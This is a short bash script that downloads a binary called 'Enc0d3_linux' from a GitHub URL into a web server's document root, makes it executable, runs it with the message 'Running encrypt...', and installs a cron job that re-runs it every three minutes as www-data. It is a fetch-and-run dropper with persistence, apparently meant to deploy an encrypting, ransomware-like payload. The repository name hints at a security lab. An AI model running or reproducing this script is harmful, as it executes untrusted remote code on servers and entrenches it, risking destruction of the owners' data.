#!/bin/bash

# Define the destination directory
DEST_DIR="/var/www/html"

# Ensure the destination directory exists
if [ ! -d "$DEST_DIR" ]; then
    echo "Destination directory $DEST_DIR does not exist. Creating it."
    mkdir -p "$DEST_DIR"
fi

# Download the file from the URL and save it to the destination directory
echo "Downloading..."
wget -O "$DEST_DIR/Enc0d3_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3_linux

if [ $? -eq 0 ]; then
    echo "Download successful."
else
    echo "Download failed." >&2
    exit 1
fi

# Set execute permissions for the downloaded file
chmod +x "$DEST_DIR/Enc0d3_linux"
echo "Changed file permissions."

# Run the file
echo "Running encrypt..."
"$DEST_DIR/Enc0d3_linux"

if [ $? -eq 0 ]; then
    echo "Execution successful."
else
    echo "Error running the file." >&2
    exit 1
fi

# Add a cron job to run the file every 3 minutes for www-data
CRON_JOB="*/3 * * * * $DEST_DIR/Enc0d3_linux"

# Check if the cron job already exists
(crontab -u www-data -l | grep -F "$DEST_DIR/Enc0d3_linux") > /dev/null
if [ $? -ne 0 ]; then
    (crontab -u www-data -l; echo "$CRON_JOB") | crontab -u www-data -
    echo "Scheduled a cron job for www-data to run the file every 3 minutes."
else
    echo "Cron job for www-data already exists."
fi
